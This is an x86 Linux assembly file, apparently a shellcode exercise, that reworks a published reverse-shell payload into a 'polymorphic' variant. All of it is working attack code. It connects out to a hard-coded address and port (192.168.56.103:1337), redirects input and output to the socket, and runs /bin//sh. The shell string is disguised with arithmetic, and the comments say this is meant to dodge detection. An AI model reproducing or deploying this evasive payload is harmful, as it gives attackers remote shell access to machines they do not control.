; Just a polymorphic version of original code by Julien Ahrens (@MrTuxracer), all credit goes to him
; You can find the original shellcode on http://shell-storm.org/shellcode/files/shellcode-883.php
section .text

      global _start

_start:
	xor ebx,ebx	;newly added instruction meant to reduce the code
	mul ebx		;zero out eax and edx
	;push 0x66
	;pop eax - eax is 0, so simply mov al, 0x66 will reduce shellcode length
	mov al, 0x66	
	;push 0x1 
	;pop ebx - ebx is 0, so simply mov bl, 0x1 will reduce the shellcode length
	mov bl, 0x1
	;xor edx,edx - not needed since edx is already 0
	push edx
	push ebx
	push 0x2
	mov ecx, esp
	int 0x80

	xchg edx, eax
	mov al,0x66
	push dword 0x6738a8c0 ;ip: 192.168.56.103 - this is user supplied and shouldn't be detectable
	push word 0x3905 ;<port: 1337 - this is user supplied and shouldn't be detectable
	inc ebx
	push bx
	mov ecx, esp
	push 0x10
	push ecx
	push edx
	mov ecx, esp
	inc ebx
	int 0x80
	push 0x2
	pop ecx
	xchg edx,ebx

loop:
	mov al,0x3f
	int 0x80
	dec ecx
	jns loop

	mov al,0xb
	inc ecx
	mov edx,ecx
	push edx

	;push 0x68732f2f - switch out push instruction with some arithmetic operations and register push
	mov ebx, 0xa1ccbcbd
	ror ebx, 0x2
	push ebx

	;push 0x6e69622f - switch out push instruction with some arithmetic operations and register push
	add ebx, 0x5f63301
	sub bl, 0x1
	push ebx
	mov ebx,esp
	int 0x80
